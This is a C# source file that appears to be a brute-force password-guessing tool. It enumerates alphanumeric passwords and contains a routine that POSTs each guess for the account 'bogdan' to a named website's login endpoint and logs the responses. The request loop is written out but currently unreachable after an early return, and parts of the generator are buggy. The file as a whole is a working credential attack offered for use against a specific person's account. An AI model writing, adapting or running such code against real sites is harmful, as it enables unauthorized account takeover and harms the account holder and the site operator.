using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Threading.Tasks;

namespace ProFighters
{
    class Program
    {
        StreamWriter writetext = new StreamWriter("write2.txt", false);

        HttpClient client = new HttpClient();

        private static Char[] characters=
        {
            'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
            'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
            'u', 'v', 'w', 'x', 'y', 'z','A','B','C','D','E',
            'F','G','H','I','J','K','L','M','N','O','P','Q','R',
            'S','T','U','V','W','X','Y','Z','1','2','3','4','5',
            '6','7','8','9','0'
        };

        private static int index_changing_char;
        private static int chars_size = characters.Count();
        private static int index = -1;
        private static int pass_size = 0;

        void init( string pass)
        {
            pass_size = pass.Count();
            chars_size = characters.Count();
            if (pass.Equals(""))
            {
                index = -1;
            }
            else
                index = characters.ToList().IndexOf(pass[pass.Count() - 1]);
            index_changing_char = pass.Count();
        }

        void generate_new_pass(ref string x)
        {
            index = (index + 1) % characters.Count(); 

            if (index == 0)
            {
                index_changing_char--;

                if (index_changing_char < 0)
                {
                    x = new string(characters[0], pass_size + 1);
                    init(x);
                }
                else
                {
                    x.Remove(pass_size - 1);
                    x += characters[0];
                    //x.Replace()
                }
            }

            
            else
            {

            }

                x= x.Substring(0, x.Count() - 1) + characters.ElementAt(index);
            }


        static String passos;

        void make_pass_recursive(int level) {

            if (level < 0)
            {
                writetext.Write("\nNew pass at " + DateTime.Now + " with password " + passos);
                writetext.Flush();
                return;
            }

            passos += "a";

            for (int i=0 ;i < chars_size; i++)
            {
                passos=passos.Remove(passos.Count() -1);
                passos += characters.ElementAt(i);
                make_pass_recursive(level - 1);
            }

        }

        void get_request(String pass)
        {
            writetext.Write("\nNew request at " + DateTime.Now + " with password " + pass);

            var pairs = new List<KeyValuePair<string, string>>
            {
                new KeyValuePair<string, string>("login", "bogdan"),
                new KeyValuePair<string, string>("password", pass),
                new KeyValuePair<string, string>("Submit", "Login")
            };

            pairs[1] = new KeyValuePair<string, string>("password", pass);

            using (var content = new FormUrlEncodedContent(pairs))
            {
                client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("text/html"));
                var response = client.PostAsync("http://www.profighters.ro/index.php/main/login_exec", content).Result;
                writetext.Write("  Status=" + response.StatusCode + "  " + response.IsSuccessStatusCode.ToString());
                writetext.Flush();
            }
        }
        
        
        static void Main(string[] args)
        {
            Program A = new Program();

            string pass = "";

            A.make_pass_recursive(4);
            return;

            for (int i = 0; i < 1000; i++)
            {
                A.generate_new_pass(ref pass);
                A.get_request(pass);
            }
        }
    }
}
